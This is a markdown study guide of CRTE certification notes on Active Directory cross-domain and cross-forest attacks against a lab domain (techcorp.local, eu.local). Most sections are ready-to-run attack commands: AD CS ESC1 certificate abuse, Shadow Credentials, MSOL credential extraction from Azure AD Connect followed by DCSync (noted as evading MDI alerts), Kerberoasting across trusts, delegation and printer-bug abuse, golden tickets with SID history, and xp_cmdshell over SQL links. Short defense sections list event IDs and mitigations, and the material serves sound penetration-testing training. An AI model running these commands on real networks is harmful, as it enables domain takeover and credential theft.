# Cross Attacks - CRTE

## Overview
Cross-domain and cross-forest attack techniques for CRTE certification, including AD CS, Shadow Credentials, Azure AD Integration, and various trust-based attacks.

**Sources**:
- [johnermac.github.io](https://johnermac.github.io/review/crte/)
- [slytechroot/CRTO-CRTP-CRTE](https://github.com/slytechroot/CRTO-CRTP-CRTE)
- [francescolonardo/CRTE-Preparation](https://github.com/francescolonardo/CRTE-Preparation)

## ADCS

**Active Directory Certificate Services (AD CS)** enables use of Public Key Infrastructure (PKI) in active directory forest.

> AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.

> AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization

**Key Terms**:
- **CA** - The certification authority that issues certificates. The server with AD CS role (DC or separate) is the CA
- **Certificate** - Issued to a user or machine and can be used for authentication, encryption, signing etc
- **CSR** - Certificate Signing Request made by a client to the CA to request a certificate
- **Certificate Template** - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc
- **EKU OIDs** - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.)

### Enumerate AD CS

**Using Certify** ([Certify on GitHub](https://github.com/GhostPack/Certify)):
```powershell
Certify.exe cas
```

**Enumerate templates**:
```powershell
Certify.exe find
```

**Enumerate vulnerable templates**:
```powershell
Certify.exe find /vulnerable
```

**Common requirements/misconfigurations for all the Escalations**:
- CA grants normal/low-privileged users enrollment rights
- Manager approval is disabled
- Authorization signatures are not required
- The target template grants normal/low-privileged users enrollment rights

### Escalation

**Example Scenario**:
- In techcorp, the user pawadmin has enrollment rights to a template **-ForAdminsofPrivilegedAccessWorkstations**
- The template has **ENROLLEE_SUPPLIES_SUBJECT** value for msPKI-Certificates-Name-Flag. (**ESC1**)
- This means pawadmin can request certificate for ANY user

**Note**: This does not show up when we enumerate vulnerable templates in Certify. Use:
```powershell
Certify.exe find
Certify.exe find /enrolleeSuppliesSubject
```

**If we have the certificate of pawadmin** (extracted from us-jump) (**THEFT4**):

Use the certificate to request a TGT for pawadmin and inject it:
```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
```

### Escalation to DA

**Request a certificate for DA**:
```powershell
C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
```

**Convert from cert.pem to pfx**:
```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx
```

**Request DA TGT and inject it**:
```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt
```

### Escalation to EA

**Request a certificate for EA**:
```powershell
C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
```

**Convert from cert.pem to pfx**:
```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\EA.pfx
```

**Request EA TGT and inject it**:
```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:SecretPass@123 /nowrap /ptt
```

### Defense - AD CS Attacks
> See [AD Defense](../crtp/ad-defense.md) for detailed detection and mitigation

**Detection**:
- Monitor for certificate template enumeration
- Monitor for vulnerable template abuse
- Security Event ID 4886/4887 - Certificate requests
- Monitor for EDITF_ATTRIBUTESUBJECTALTNAME2 flag
- Monitor for unauthorized certificate enrollment

**Mitigation**:
- Regularly audit certificate templates
- Remove vulnerable template configurations
- Limit enrollment permissions
- Monitor for certificate-based authentication abuse
- Use strong template permissions

## Shadow Credentials

Users and Computers have **msDS-KeyCredentialLink** attribute that contains the raw public keys of certificate that can be used as an alternate credential.

**Key Points**:
- This attribute is used when we configure Windows Hello for Business (WHfB)
- By default, Key Admins and Enterprise Key Admins have rights to modify the **msDS-KeyCredentialLink attribute**
- User to User (U2U) Service Ticket can be requested to decrypt the encrypted **NTLM_SUPPLEMENTAL_CREDENTIAL** entity from Privilege Attribute Certificate (PAC) and extract NTLM hash

**Pre-requisites to abuse Shadow Credentials**:
- AD CS (Key Trust if AD CS is not present)
- Support for PKINIT and at least one DC with Windows Server 2016 or above
- Permissions (GenericWrite/GenericAll) to modify the msDS-KeyCredentialLink attribute of the target object

### Abusing User Object

**Enumerate the permissions**:
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
```

**Add the Shadow Credential**:
```powershell
Whisker.exe add /target:supportXuser
```

**Verify**:
```powershell
Get-DomainUser -Identity supportXuser
```

**Request the TGT by leveraging the certificate**:
```powershell
Rubeus.exe asktgt /user:supportXuser /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW.... /password:"1OT0qAom3..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show /nowrap
```

**Inject the TGT**:
```powershell
Rubeus.exe ptt /ticket:doIGgDCCBnygAwIBBaEDAgEW...
```

### Abusing Computer Object

**Enumerate the permissions**:
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin'}
```

**Add the Shadow Credentials**:
```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /run:cmd.exe" "exit"
Whisker.exe add /target:us-helpdesk$
```

**Verify**:
```powershell
Get-DomainComputer -Identity us-helpdesk
```

**Request the TGT**:
```powershell
Rubeus.exe asktgt /user:us-helpdesk$ /certificate:MIIJ0AIBAzCCCYwGCSqGSIb... /password:"ViGFoZJa..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show
```

**Request and Inject the TGS by impersonating the user**:
```powershell
Rubeus.exe s4u /dc:us-dc.us.techcorp.local /ticket:doIGkDCCBoygAwIBBaEDAgEW... /impersonateuser:administrator /ptt /self /altservice:cifs/us-helpdesk
```

### Defense - Shadow Credentials
> See [AD Defense - ACL Attacks](../crtp/ad-defense.md#defense---acl-attacks) for detailed detection and mitigation

**Detection**:
- Security Event ID 5136 - Monitor for msDS-KeyCredentialLink modifications
- Security Event ID 4769 - Monitor for certificate-based authentication
- Monitor for Whisker usage
- Monitor for unauthorized key credential additions

**Mitigation**:
- Limit who can modify msDS-KeyCredentialLink (Key Admins, Enterprise Key Admins)
- Monitor for shadow credential abuse
- Use least privilege for key management
- Regularly audit key credential permissions

## Azure AD Integration

Azure AD is a popular method to extend identity management from on-premises AD to Microsoft's Azure offerings.

**Key Points**:
- Many enterprises use their on-prem AD identities to access Azure applications
- A single user identity for authentication and authorization to all resources, regardless of location is hybrid identity

**Integration Methods**:
- Password Hash Sync (PHS)
- Pass-Through Authentication (PTA)
- Federation

> Azure AD Connect is installed on-premises and has a high privilege account both in on AD and Azure AD!

### PHS

> Let's target PHS.

**Key Points**:
- It shares users and their password hashes from on-premises AD to Azure AD
- A new users **MSOL_** is created which has Synchronization rights (DCSync) on the domain!

**Enumerate the PHS account and server where AD Connect is installed**

**PowerView**:
```powershell
Get-DomainUser -Identity "MSOL_*" -Domain techcorp.local
```

**ActiveDirectory module**:
```powershell
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName,Description | fl
```

**Extract MSOL_ credentials** (with administrative privileges on us-adconnect):
```powershell
.\adconnect.ps1
```

> [Note] The above script's code runs powershell.exe so verbose logs (like transcripts) will be there.

**Run commands as MSOL_**:
```powershell
runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd
```

**Execute DCSync attack**:
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local"'
```

> [NOTE] Because AD Connect synchronizes hashes every two minutes, in an Enterprise Environment, the **MSOL_** account will be **excluded from tools like MDI**!

> This will allow us to run DCSync without any alerts!

### Defense - Azure AD Integration (PHS)
> See [AD Defense - ACL Attacks](../crtp/ad-defense.md#defense---acl-attacks) and [MDI](../crtp/ad-defense.md#mdi) for detailed detection and mitigation

**Detection**:
- Monitor for MSOL_ account enumeration
- Monitor for AD Connect server access
- Monitor for MSOL_ credential extraction
- Security Event ID 4662 - Monitor for DCSync from MSOL_ account

**Mitigation**:
- Secure AD Connect server (Tier 0 asset)
- Limit access to MSOL_ account
- Monitor for MSOL_ account abuse
- Use Privileged Access Workstations (PAWs)
- Consider using Pass-Through Authentication (PTA) instead of PHS

## Forest Root

- Child to Forest Root - Trust Key
- Child to Forest Root - krbtgt

Same material of CRTP:
> See [CRTP - Privesc Across Trusts](https://johnermac.github.io/notes/crtp/domprivesc/#privesc---across-trusts)

## Kerberoast across Forest Trusts

> It is possible to execute Kerberoast across Forest trusts.

**Enumerate named service accounts across forest trusts**

**PowerView**:
```powershell
Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName}
```

**ActiveDirectory Module**:
```powershell
Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name}
```

**Request a TGS**:
```powershell
C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:euhashes.txt
```

**Check for the TGS**:
```powershell
klist
```

**Crack using John**:
```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

### Defense - Kerberoast Across Forest Trusts
> See [AD Defense - Kerberoast](../crtp/ad-defense.md#defense---kerberoast) and [AD Defense - Trust Tickets](../crtp/ad-defense.md#defense---trust-tickets) for detailed detection and mitigation

**Detection**:
- Security Event ID 4769 - Monitor for cross-forest ticket requests
- Monitor for Kerberoasting across trust boundaries
- Filter for: Service name not krbtgt, Ticket encryption type 0x17

**Mitigation**:
- Use Selective Authentication on inter-forest trusts
- Use strong passwords for service accounts across trusts
- Monitor for cross-forest authentication abuse
- Use gMSA for service accounts

**Request TGS across trust using PowerShell**:
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/eu-file.eu.local@eu.local
```

## Delegations

### Constrained Delegation with Protocol Transition

> The classic Constrained Delegation does not work across forest trusts.
> But we can abuse it once we have a foothold across forest trust.

**PowerView**:
```powershell
Get-DomainUser –TrustedToAuth -Domain eu.local
Get-DomainComputer –TrustedToAuth -Domain eu.local
```

**ActiveDirectory module**:
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server domain.local
```

**Request an alternate ticket using Rubeus**:
```powershell
C:\AD\Tools\Rubeus.exe hash /password:Qwerty@2019 /user:storagesvc /domain:domain.local
C:\AD\Tools\Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:domain.local /msdsspn:nmagent/dc.domain.local /altservice:ldap /dc:dc.domain.local /ptt
```

### Unconstrained Delegation

See CRTP notes for unconstrained delegation basics.

## Across Forest using Trust Tickets

Techniques for using trust tickets to move across forests.

## Trust Abuse (MSSQL Servers)

Abusing MSSQL servers across trust relationships.

## Foreign Security Principals

Working with foreign security principals in cross-forest scenarios.

## Abusing PAM Trust

Abusing Privileged Access Management (PAM) trusts.

### Defense - Cross-Forest Attacks
> See [AD Defense - Trust Tickets](../crtp/ad-defense.md#defense---trust-tickets) for detailed detection and mitigation

**Detection**:
- Monitor for cross-forest authentication attempts
- Security Event ID 4769 - Monitor for inter-forest ticket requests
- Monitor for trust key extraction
- Monitor for SID History abuse

**Mitigation**:
- Enable SID Filtering on inter-forest trusts
- Use Selective Authentication on inter-forest trusts
- Regularly rotate trust keys
- Monitor for unauthorized cross-forest access
- Limit trust relationships where possible

## Tools
- **Certify** - AD CS enumeration and attacks
- **Rubeus** - Certificate-based authentication and Kerberos
- **Whisker** - Shadow Credentials manipulation
- **PowerView** - Cross-domain enumeration
- **Active Directory Module** - Native AD cmdlets
- **Mimikatz** - DCSync and credential extraction

## AD CS (Certificate Services) ESC1 Abuse

**Enumerate CAs**

```powershell
PS C:\AD\Tools> C:\AD\Tools\Certify.exe cas
```

**Enumerate templates**

```powershell
PS C:\AD\Tools> C:\AD\Tools\Certify.exe find
PS C:\AD\Tools> C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
```

**Request certificate for Domain Admin**

```powershell
C:\Windows\system32> C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
```

**Convert certificate to PFX**

```powershell
C:\Windows\system32> C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx
```

**Request TGT using certificate**

```powershell
C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:P@ssw0rd1! /nowrap /ptt
```

**Request Enterprise Admin certificate**

```powershell
C:\Windows\system32> C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:P@ssw0rd1! /nowrap /ptt
```

## Intra-Forest Trust Attacks

### Intra-Forest Unconstrained Delegation & Printer Bug Abuse & DCSync Attack

**Start TGT monitoring**

```powershell
C:\Users\webmaster> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /targetuser:TECHCORP-DC$ /interval:5 /nowrap
```

**Trigger Printer Bug**

```powershell
PS C:\AD\Tools> C:\AD\Tools\MS-RPRN.exe \\techcorp-dc.techcorp.local \\us-web.us.techcorp.local
```

**Inject captured TGT and perform DCSync**

```powershell
C:\AD\Tools> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /ticket:<Base64EncodedTicket>
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:techcorp\krbtgt /domain:techcorp.local" "exit"
```

### Intra-Forest Constrained Delegation Abuse & DCSync Attack

**Enumerate constrained delegation**

```powershell
PS C:\AD\Tools> Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server eu.local
```

**Calculate password hash**

```powershell
C:\Users\studentuser51> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /password:Qwerty@123 /user:storagesvc /domain:eu.local
```

**Request S4U ticket with LDAP alternate service**

```powershell
C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/eu-dc.eu.local /altservice:ldap /dc:eu-dc.eu.local /ptt
```

**Perform DCSync**

```powershell
C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:eu\krbtgt /domain:eu.local" "exit"
```

### Intra-Forest Azure AD Connect Abuse & DCSync Attack

**Find Azure AD Connect machine**

```powershell
PS C:\AD\Tools> Get-ADUser -Filter {Name -like "MSOL_*"} -Properties Description
```

**Extract MSOL account password**

```powershell
C:\Users\Administrator.US> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args %Pwn% "exit"
```

**Perform DCSync using MSOL account**

```powershell
C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:MSOL_1234567890 /rc4:<hash> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:techcorp\krbtgt /domain:techcorp.local" "exit"
```

### Intra-Forest Trust Key Abuse via SID History Injection

**Extract trust key**

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
```

**Create Golden Ticket with SID History**

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-... /sids:S-1-5-21-...-519 /krbtgt:<trust_key> /ptt"'
```

## Cross-Forest Trust Attacks

### Cross-Forest Kerberoasting Attack

**Enumerate service accounts in trusted forest**

```powershell
PS C:\AD\Tools> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server eu.local
```

**Kerberoast across trust**

```powershell
C:\AD\Tools> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:storagesvc /domain:eu.local /simple /outfile:C:\AD\Tools\eu_hashes.txt
```

### Cross-Forest Unconstrained Delegation & Printer Bug Abuse & DCSync Attack

**Monitor for TGTs from trusted forest**

```powershell
C:\Users\webmaster> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /targetuser:EU-DC$ /interval:5 /nowrap
```

**Trigger Printer Bug across trust**

```powershell
PS C:\AD\Tools> C:\AD\Tools\MS-RPRN.exe \\eu-dc.eu.local \\us-web.us.techcorp.local
```

**Inject TGT and perform DCSync**

```powershell
C:\AD\Tools> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /ticket:<Base64EncodedTicket>
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:eu\krbtgt /domain:eu.local" "exit"
```

### Cross-Forest Trust Account Abuse & SID History Injection

**Extract trust account password**

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:eu\EU$"'
```

**Create Golden Ticket with SID History**

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-... /sids:S-1-5-21-...-519 /krbtgt:<trust_account_hash> /ptt"'
```

### Cross-Forest SQL Server Link Abuse

**Enumerate SQL Server links**

```powershell
PS C:\AD\Tools> Get-SQLServerLink -Instance us-mssql.us.techcorp.local
```

**Query linked server**

```powershell
PS C:\AD\Tools> Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local
```

**Execute commands via linked server**

```powershell
PS C:\AD\Tools> Invoke-SQLOSCmd -Instance us-mssql.us.techcorp.local -Query "EXEC('xp_cmdshell ''whoami''') AT [eu-mssql.eu.local]"
```

### Cross-Forest Foreign Security Principal & ACL Abuse

**Enumerate foreign security principals**

```powershell
PS C:\AD\Tools> Get-ADObject -Filter {ObjectClass -eq "foreignSecurityPrincipal"} -Server eu.local
```

**Find ACLs with foreign security principals**

```powershell
PS C:\AD\Tools> Get-DomainObjectAcl -SearchBase "DC=eu,DC=local" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -like "S-1-5-21-*"}
```

### Cross-Forest PAM Trust Abuse

**Enumerate PAM trusts**

```powershell
PS C:\AD\Tools> Get-ADTrust -Filter * | Where-Object {$_.TrustType -eq "PAM"}
```

**Abuse PAM trust for privilege escalation**

```powershell
# PAM trusts allow temporary elevation of privileges
# Use PAM group membership to gain access
```

### Cross-Forest Trust Account Abuse via CredSSP

**Enable CredSSP delegation**

```powershell
Enable-WSManCredSSP -Role Client -DelegateComputer *
```

**Access remote system with CredSSP**

```powershell
Enter-PSSession -ComputerName eu-dc.eu.local -Authentication CredSSP -Credential (Get-Credential)
```

### Cross-Forest Trust Transitivity Bypass via Referral TGT

**Request referral TGT**

```powershell
C:\AD\Tools> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:Administrator /domain:us.techcorp.local /tgtdeleg
```

**Use referral TGT to access trusted forest**

```powershell
# Referral TGT allows access to resources in trusted forest
```

## Last Updated
January 2025
